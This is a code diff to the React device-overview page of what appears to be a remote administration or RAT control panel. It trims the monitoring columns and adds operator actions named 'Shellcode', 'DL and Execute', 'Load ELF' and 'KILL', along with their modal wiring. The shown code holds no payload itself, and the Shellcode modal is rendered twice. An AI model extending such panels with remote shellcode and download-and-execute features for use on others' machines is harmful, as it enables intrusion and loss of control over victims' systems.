@@ -1,7 +1,7 @@
 import React, {useEffect, useRef, useState} from 'react';
 import ProTable, {TableDropdown} from '@ant-design/pro-table';
 import {Button, Image, message, Modal, Progress, Tooltip} from 'antd';
-import {catchBlobReq, formatSize, request, tsToTime, waitTime} from "../utils/utils";
+import { catchBlobReq, formatSize, request, tsToTime, waitTime, renderUnixEpochToHumanReadable } from "../utils/utils";
 import {QuestionCircleOutlined} from "@ant-design/icons";
 import i18n from "../locale/locale";
 
@@ -15,11 +15,17 @@ let ComponentMap = {
 	ProcMgr: null,
 	Desktop: null,
 	Execute: null,
+	Shellcode: null,
+	Executable: null,
+	Loadelf: null,
 };
 
 function overview(props) {
 	const [loading, setLoading] = useState(false);
 	const [execute, setExecute] = useState(false);
+	const [shellcode, setShellcode] = useState(false);
+	const [executable, setExecutable] = useState(false);
+	const [loadelf, setLoadelf] = useState(false);
 	const [desktop, setDesktop] = useState(false);
 	const [procMgr, setProcMgr] = useState(false);
 	const [explorer, setExplorer] = useState(false);
@@ -44,65 +50,11 @@ function overview(props) {
 			width: 90
 		},
 		{
-			key: 'ping',
-			title: 'Ping',
-			dataIndex: 'latency',
-			ellipsis: true,
-			renderText: (v) => String(v) + 'ms',
-			width: 60
-		},
-		{
-			key: 'cpu_usage',
-			title: i18n.t('OVERVIEW.CPU_USAGE'),
-			dataIndex: 'cpu_usage',
-			ellipsis: true,
-			render: (_, v) => <UsageBar title={renderCPUStat(v.cpu)} {...v.cpu} />,
-			width: 100
-		},
-		{
-			key: 'ram_usage',
-			title: i18n.t('OVERVIEW.RAM_USAGE'),
-			dataIndex: 'ram_usage',
-			ellipsis: true,
-			render: (_, v) => <UsageBar title={renderRAMStat(v.ram)} {...v.ram} />,
-			width: 100
-		},
-		{
-			key: 'disk_usage',
-			title: i18n.t('OVERVIEW.DISK_USAGE'),
-			dataIndex: 'disk_usage',
-			ellipsis: true,
-			render: (_, v) => <UsageBar title={renderDiskStat(v.disk)} {...v.disk} />,
-			width: 100
-		},
-		{
 			key: 'os',
 			title: i18n.t('OVERVIEW.OS'),
 			dataIndex: 'os',
 			ellipsis: true,
 			width: 80
-		},
-		{
-			key: 'arch',
-			title: i18n.t('OVERVIEW.ARCH'),
-			dataIndex: 'arch',
-			ellipsis: true,
-			width: 70
-		},
-		{
-			key: 'ram_total',
-			title: i18n.t('OVERVIEW.RAM'),
-			dataIndex: 'ram_total',
-			ellipsis: true,
-			renderText: formatSize,
-			width: 70
-		},
-		{
-			key: 'mac',
-			title: 'MAC',
-			dataIndex: 'mac',
-			ellipsis: true,
-			width: 100
 		},
 		{
 			key: 'lan',
@@ -119,19 +71,20 @@ function overview(props) {
 			width: 100
 		},
 		{
+			key: 'clientuptime',
+			title: 'Client Uptime',
+			dataIndex: 'clientuptime',
+			ellipsis: true,
+			renderText: renderUnixEpochToHumanReadable,
+			width: 50
+		},
+		{
 			key: 'uptime',
 			title: i18n.t('OVERVIEW.UPTIME'),
 			dataIndex: 'uptime',
 			ellipsis: true,
 			renderText: tsToTime,
-			width: 100
-		},
-		{
-			key: 'net_stat',
-			title: i18n.t('OVERVIEW.NETWORK'),
-			ellipsis: true,
-			renderText: (_, v) => renderNetworkIO(v),
-			width: 170
+			width: 50
 		},
 		{
 			key: 'option',
@@ -170,95 +123,26 @@ function overview(props) {
 
 	useEffect(() => {
 		// auto update is only available when all modal are closed.
-		if (!execute && !desktop && !procMgr && !explorer && !generate && !terminal) {
+		if (!execute && !shellcode && !desktop && !procMgr && !explorer && !generate && !terminal) {
 			let id = setInterval(getData, 3000);
 			return () => {
 				clearInterval(id);
 			};
 		}
-	}, [execute, desktop, procMgr, explorer, generate, terminal]);
+	}, [execute, shellcode, desktop, procMgr, explorer, generate, terminal]);
 
-	function renderCPUStat(cpu) {
-		let { model, usage, cores } = cpu;
-		usage = Math.round(usage * 100) / 100;
-		cores = {
-			physical: Math.max(cores.physical, 1),
-			logical: Math.max(cores.logical, 1),
-		}
-		return (
-			<div>
-				<div
-					style={{
-						fontSize: '10px',
-					}}
-				>
-					{model}
-				</div>
-				{i18n.t('OVERVIEW.CPU_USAGE') + i18n.t('COMMON.COLON') + usage + '%'}
-				<br />
-				{i18n.t('OVERVIEW.CPU_LOGICAL_CORES') + i18n.t('COMMON.COLON') + cores.logical}
-				<br />
-				{i18n.t('OVERVIEW.CPU_PHYSICAL_CORES') + i18n.t('COMMON.COLON') + cores.physical}
-			</div>
-		);
-	}
-	function renderRAMStat(info) {
-		let { usage, total, used } = info;
-		usage = Math.round(usage * 100) / 100;
-		return (
-			<div>
-				{i18n.t('OVERVIEW.RAM_USAGE') + i18n.t('COMMON.COLON') + usage + '%'}
-				<br />
-				{i18n.t('OVERVIEW.FREE') + i18n.t('COMMON.COLON') + formatSize(total - used)}
-				<br />
-				{i18n.t('OVERVIEW.USED') + i18n.t('COMMON.COLON') + formatSize(used)}
-				<br />
-				{i18n.t('OVERVIEW.TOTAL') + i18n.t('COMMON.COLON') + formatSize(total)}
-			</div>
-		);
-	}
-	function renderDiskStat(info) {
-		let { usage, total, used } = info;
-		usage = Math.round(usage * 100) / 100;
-		return (
-			<div>
-				{i18n.t('OVERVIEW.DISK_USAGE') + i18n.t('COMMON.COLON') + usage + '%'}
-				<br />
-				{i18n.t('OVERVIEW.FREE') + i18n.t('COMMON.COLON') + formatSize(total - used)}
-				<br />
-				{i18n.t('OVERVIEW.USED') + i18n.t('COMMON.COLON') + formatSize(used)}
-				<br />
-				{i18n.t('OVERVIEW.TOTAL') + i18n.t('COMMON.COLON') + formatSize(total)}
-			</div>
-		);
-	}
-	function renderNetworkIO(device) {
-		// Make unit starts with Kbps.
-		let sent = device.net_sent * 8 / 1024;
-		let recv = device.net_recv * 8 / 1024;
-		return `${format(sent)} ↑ / ${format(recv)} ↓`;
 
-		function format(size) {
-			if (size <= 1) return '0 Kbps';
-			// Units array is large enough.
-			let k = 1024,
-				i = Math.floor(Math.log(size) / Math.log(k)),
-				units = ['Kbps', 'Mbps', 'Gbps', 'Tbps'];
-			return (size / Math.pow(k, i)).toFixed(1) + ' ' + units[i];
-		}
-	}
 	function renderOperation(device) {
 		let menus = [
 			{key: 'execute', name: i18n.t('OVERVIEW.EXECUTE')},
+			{key: 'executable', name: "DL and Execute"},
+			{key: 'loadelf', name: "Load ELF"},
+			{key: 'shellcode', name: i18n.t('OVERVIEW.SHELLCODE')},
 			{key: 'desktop', name: i18n.t('OVERVIEW.DESKTOP')},
 			{key: 'screenshot', name: i18n.t('OVERVIEW.SCREENSHOT')},
-			{key: 'lock', name: i18n.t('OVERVIEW.LOCK')},
-			{key: 'logoff', name: i18n.t('OVERVIEW.LOGOFF')},
-			{key: 'hibernate', name: i18n.t('OVERVIEW.HIBERNATE')},
-			{key: 'suspend', name: i18n.t('OVERVIEW.SUSPEND')},
 			{key: 'restart', name: i18n.t('OVERVIEW.RESTART')},
 			{key: 'shutdown', name: i18n.t('OVERVIEW.SHUTDOWN')},
-			{key: 'offline', name: i18n.t('OVERVIEW.OFFLINE')},
+			{key: 'KILL', name: 'KILL'},
 		];
 		return [
 			<a key='terminal' onClick={() => onMenuClick('terminal', device)}>{i18n.t('OVERVIEW.TERMINAL')}</a>,
@@ -273,6 +157,7 @@ function overview(props) {
 	}
 
 	function onMenuClick(act, value) {
+
 		const device = value;
 		let hooksMap = {
 			terminal: setTerminal,
@@ -280,6 +165,9 @@ function overview(props) {
 			generate: setGenerate,
 			procmgr: setProcMgr,
 			execute: setExecute,
+			executable: setExecutable,
+			loadelf: setLoadelf,
+			shellcode: setShellcode,
 			desktop: setDesktop,
 		};
 		if (hooksMap[act]) {
@@ -303,7 +191,10 @@ function overview(props) {
 			}).catch(catchBlobReq);
 			return;
 		}
+
 		Modal.confirm({
+			okText:"Yes",
+        	cancelText:"No",
 			title: i18n.t('OVERVIEW.OPERATION_CONFIRM').replace('{0}', i18n.t('OVERVIEW.'+act.toUpperCase())),
 			icon: <QuestionCircleOutlined/>,
 			onOk() {
@@ -319,6 +210,7 @@ function overview(props) {
 	}
 
 	function toolBar() {
+		//return
 		return (
 			<Button type='primary' onClick={() => onMenuClick('generate', true)}>{i18n.t('OVERVIEW.GENERATE')}</Button>
 		)
@@ -397,6 +289,30 @@ function overview(props) {
 				/>
 			}
 			{
+				ComponentMap.Shellcode &&
+				<ComponentMap.Shellcode
+					visible={shellcode}
+					device={shellcode}
+					onCancel={setShellcode.bind(null, false)}
+				/>
+			}
+			{
+				ComponentMap.Executable &&
+				<ComponentMap.Executable
+					visible={executable}
+					device={executable}
+					onCancel={setExecutable.bind(null, false)}
+				/>
+			}
+			{
+				ComponentMap.Loadelf &&
+				<ComponentMap.Loadelf
+					visible={loadelf}
+					device={loadelf}
+					onCancel={setLoadelf.bind(null, false)}
+				/>
+			}
+			{
 				ComponentMap.Explorer &&
 				<ComponentMap.Explorer
 					open={explorer}
@@ -426,6 +342,14 @@ function overview(props) {
 					open={terminal}
 					device={terminal}
 					onCancel={setTerminal.bind(null, false)}
+				/>
+			}
+			{
+				ComponentMap.Shellcode &&
+				<ComponentMap.Shellcode
+					open={shellcode}
+					device={shellcode}
+					onCancel={setShellcode.bind(null, false)}
 				/>
 			}
 			<ProTable
